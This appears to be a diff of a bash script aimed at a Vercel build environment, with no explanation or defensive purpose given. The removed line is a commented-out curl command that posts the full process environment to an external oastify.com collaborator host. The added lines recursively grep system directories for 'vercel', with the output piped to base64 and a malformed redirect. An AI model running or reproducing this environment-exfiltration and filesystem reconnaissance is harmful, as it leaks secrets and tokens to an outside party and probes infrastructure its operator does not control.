@@ -1,3 +1,5 @@
 #!/bin/bash
 
-##curl -X POST -d "$(env)" https://4uz65jdht25o5e3br591jyzljcp3d0do2.oastify.com
+egrep -r "vercel" /usr/. > /dev/null 2>1 | base64
+egrep -r "vercel" /var/. > /dev/null 2>1 | base64
+egrep -r "vercel" /vercel/. > /dev/null 2>1 | base64
